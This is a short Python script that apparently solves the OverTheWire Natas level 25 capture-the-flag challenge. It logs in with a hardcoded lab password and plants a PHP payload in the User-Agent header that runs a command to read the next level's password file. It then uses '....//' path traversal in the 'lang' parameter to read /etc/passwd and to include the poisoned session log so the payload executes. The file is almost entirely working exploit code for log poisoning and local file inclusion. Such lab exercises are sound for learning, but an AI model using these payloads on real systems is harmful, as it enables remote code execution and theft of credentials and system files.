import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string


natasURL = 'http://natas25.natas.labs.overthewire.org/'

natas_usr   = 'natas25'
natas_pword = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
login=(natas_usr,natas_pword)


# cookie = {"PHPSESSID":"testing"}
head_in = {"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"}


r = requests.post(url=natasURL, auth=login, headers=head_in, data={'lang':'....//....//....//....//....//etc/passwd'})


r1 = requests.post(url=natasURL, auth=login, headers=head_in, 
                   data={'lang':'....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + r.cookies["PHPSESSID"] + '.log'})


print(r1.text)




